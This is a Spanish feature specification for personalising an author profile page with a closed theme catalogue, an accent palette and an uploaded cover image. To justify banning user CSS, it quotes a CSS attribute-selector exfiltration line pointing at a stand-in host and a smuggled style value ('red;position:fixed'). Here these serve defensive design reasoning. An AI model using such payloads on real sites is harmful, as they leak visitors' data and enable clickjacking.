---
id: FEAT-USR-016
title: Personalizar la página de autor (tema, color y fondo)
context: User
concept: AuthorPage
actors: [Writer]
spec_status: APPROVED
impl_status: DONE
priority: P3
sources:
  - docs/ui/my-profile.md
  - docs/bounded-contexts/user.md
  - conversation:2026-09-26 (P-6, U-5)
endpoints:
  - GET /me/author-page-style
  - PUT /me/author-page-style
  - PUT /me/profile/cover
  - DELETE /me/profile/cover
events: []
depends_on: [FEAT-USR-014, FEAT-USR-015, FEAT-USR-037]
updated: 2026-09-26
---

# FEAT-USR-016 — Personalizar la página de autor

## Resumen

Que la página de autor —que **es el perfil** (`P-5`)— no se vea igual que la de todos. Un tema
de un catálogo cerrado, un color de acento de una paleta cerrada, y una imagen de fondo que
sube el autor.

## La decisión que hay detrás: `U-5`

`U-5` preguntaba si la personalización tiene límites —«temas cerrados o CSS libre»— y anotaba
el motivo: **riesgo de seguridad si es libre**. `P-6` preguntaba si esto seguía en alcance.

Decidido (2026-09-26): **sigue en alcance, con catálogo cerrado más fondo subido**. Nada de CSS.

Y conviene dejar escrito por qué, porque «dejar que cada uno escriba su CSS» suena a libertad y
es otra cosa. **CSS escrito por un usuario y servido a terceros no es decoración, es código
ejecutándose en la página de quien mira**:

- un selector de atributo con una `url()` detrás **exfiltra datos**: basta con
  `input[value^="a"] { background: url(https://donde-sea/a) }` para leer letra a letra lo que hay
  en la pantalla de otro;
- `position` y `z-index` permiten **superponer** un botón falso sobre uno real, que es el
  clásico del clickjacking sin necesitar un iframe;
- `@import` y `url()` convierten cada visita en una **petición a un servidor de terceros**, que
  es como se construye un registro de quién visita el perfil de quién.

Sanear eso exige un parser de CSS con lista blanca de propiedades, y es una defensa frágil:
cada versión del navegador trae una propiedad nueva y la lista se queda corta en silencio. **Un
enum no tiene ese problema.** Lo que el usuario elige es un código; lo que se sirve son estilos
que escribió el equipo.

## Qué se puede elegir

| | Qué es | Dónde vive |
|---|---|---|
| **Tema** | Un código de un catálogo cerrado | `AuthorPageTheme` |
| **Color de acento** | Un código de una paleta cerrada | `AccentColour` |
| **Fondo** | Una imagen que sube el autor | `coverUrl` de la cuenta |

### El tema y el color son **códigos**, nunca valores

`CLASSIC`, `INK`, `PARCHMENT`, `MIDNIGHT`, `LINEN`, `BOTANICAL`. `SLATE`, `CRIMSON`, `AMBER`,
`FOREST`, `OCEAN`, `PLUM`.

**No se acepta un hexadecimal**, y no es una restricción cosmética: un color libre acaba
interpolado en un atributo `style`, y ahí una cadena que no sea un color es una inyección de
CSS por la puerta de atrás. Validar un `#rrggbb` con una expresión regular funcionaría hoy y
sería el sitio donde algún día se acepte `red;position:fixed`. El enum quita la pregunta.

El valor por defecto es `CLASSIC` con acento `SLATE`, y **se guarda explícitamente** cuando se
toca: sin fila se leen esos mismos valores, dichos en voz alta.

### El fondo es la portada del perfil, que ya existía

`User` tiene `coverUrl` y un método `updateCover` desde `FEAT-USR-014`, y **nunca tuvo
endpoint**. No se inventa una imagen nueva: esto le pone la puerta que le faltaba.

Le aplican las reglas generales de
[`file-uploads.md`](../../api/conventions/file-uploads.md), las mismas que al avatar
(`FEAT-USR-037`): **la imagen se reescribe siempre**, se le quitan los metadatos EXIF —una foto
de fondo puede llevar las coordenadas de dónde se tomó—, el límite lo aplica el servidor y lo
que se sustituye se borra en vez de quedarse huérfano.

Lo que **no** hereda es el recorte: un fondo es un banner, no un retrato, y su proporción la
decide quien diseña la pantalla. Se guarda con el lado mayor en 1600 px.

La carpeta `covers/` se añade a las públicas de `GET /media/{key}`, con la misma decisión
consciente que `book-covers`: es material que aparece en perfiles que se abren sin sesión.

## No confundir con `FEAT-USR-042`

Son las dos «apariencia» y son opuestas:

| | `FEAT-USR-016` | `FEAT-USR-042` |
|---|---|---|
| Quién lo elige | El autor | Cada quien |
| Quién lo ve | Los demás | Solo él |
| Qué pinta | Su página de autor | Toda la aplicación |
| Dónde viaja | En el perfil público | En el contexto de sesión |

## Actores y autorización

| Actor | Puede | Condición |
|---|---|---|
| `Writer` | Elegir tema, color y fondo | Cuenta activada |
| Cualquiera | Ver cómo quedó | Si el perfil se puede ver (`FEAT-USR-038`) |

El estilo viaja **dentro del perfil público**, como las referencias (`FEAT-USR-015`): la página
de autor es el perfil, y pedir su decoración aparte sería una petición más para pintar la misma
pantalla.

## Reglas de negocio

- `RN-1` El tema y el color son **códigos de un catálogo cerrado**. Nunca CSS, nunca un
  hexadecimal, nunca una URL.
- `RN-2` Un código desconocido se rechaza nombrándolo. No se ignora ni se cae al por defecto.
- `RN-3` Sin fila, `CLASSIC` y `SLATE`.
- `RN-4` El fondo es la portada de la cuenta, y se le aplican las reglas de subida de fichero:
  reescritura, EXIF fuera, límite en servidor y borrado de lo sustituido.
- `RN-5` El fondo **no se recorta**: su proporción la decide la pantalla.
- `RN-6` Quitar el fondo devuelve la página al tema sin imagen, y borra el fichero.
- `RN-7` El estilo es **contenido público**, con el techo de privacidad del perfil.
- `RN-8` No publica eventos: a nadie fuera de `User` le importa el color de una página.

## Flujos alternativos y errores

| Caso | Comportamiento | Respuesta de API |
|---|---|---|
| Tema desconocido | Se rechaza | `422` `UNKNOWN_AUTHOR_PAGE_THEME` |
| Color desconocido | Se rechaza | `422` `UNKNOWN_ACCENT_COLOUR` |
| Fondo ausente | Se rechaza | `422` `COVER_REQUIRED` |
| Fondo de más de 4 MB | Se rechaza | `422` `COVER_TOO_LARGE` |
| Fondo que no es imagen | Se rechaza | `422` `UNSUPPORTED_COVER_TYPE` |
| Imagen ilegible | Se rechaza, y dice que lo es | `422` `UNREADABLE_COVER` |
| Quitar un fondo que no había | Nada | `204` |

Se distingue «no es una imagen» de «es una imagen que no se puede leer», igual que en el avatar:
llevan a cosas distintas —elegir otro fichero, o volver a exportarlo—, y un HEIC de iPhone cae
en el primero.

## Contrato de API

| Operación | Método y ruta | `operationId` | Documento |
|---|---|---|---|
| Ver mi estilo | `GET /me/author-page-style` | `getMyAuthorPageStyle` | `openapi/paths/profiles.yaml` |
| Cambiarlo | `PUT /me/author-page-style` | `updateMyAuthorPageStyle` | `openapi/paths/profiles.yaml` |
| Subir el fondo | `PUT /me/profile/cover` | `updateProfileCover` | `openapi/paths/profiles.yaml` |
| Quitarlo | `DELETE /me/profile/cover` | `deleteProfileCover` | `openapi/paths/profiles.yaml` |

El **catálogo de temas y colores no tiene endpoint**: son dos listas cerradas que la pantalla de
edición conoce, y un endpoint que las enumerara obligaría a pedirlas antes de pintar seis
botones. Los valores válidos están en OpenAPI, que es donde el cliente los lee.

`GET /users/{userId}` gana `theme` y `accentColour` junto al `coverUrl` que ya devolvía.

## Eventos

Ninguno.

## Efectos en créditos

Ninguno.

## Modelo de datos afectado

Tabla nueva `user_ctx.author_page_style`: `user_id` (clave), `theme`, `accent_colour`,
`updated_at`. El fondo **no añade columna**: usa `cover_url`, que ya estaba en
`user_ctx.account`.

Migración `Version20260928040000`.

## Preguntas abiertas

| # | Pregunta | Impacto |
|---|---|---|
| U-5 | ¿La personalización tiene límites: temas cerrados o CSS libre? | **Resuelta: catálogo cerrado.** CSS escrito por un usuario y servido a terceros exfiltra datos por selectores de atributo, permite superponer elementos y convierte cada visita en una petición a un tercero |
| P-6 | ¿Sigue en alcance la personalización visual? | **Resuelta: sí**, con este alcance |

## Estado

**Especificación:** `APPROVED` (2026-09-26). Redactada junto con la implementación, sobre la
maqueta y las decisiones ya tomadas.

**Implementación:** `DONE` (2026-09-26). Tema, color de acento y fondo.

**Los dos primeros son códigos de un catálogo cerrado, no valores.** Un hexadecimal o un
trozo de CSS que viaja desde el cliente y acaba en una página pública es una inyección
esperando a ocurrir; seis temas y seis acentos cubren lo que la maqueta enseña sin abrir esa
puerta.

El fondo **no añadió columna**: es `cover_url`, que existía desde `FEAT-USR-014` y solo le
faltaba un endpoint.
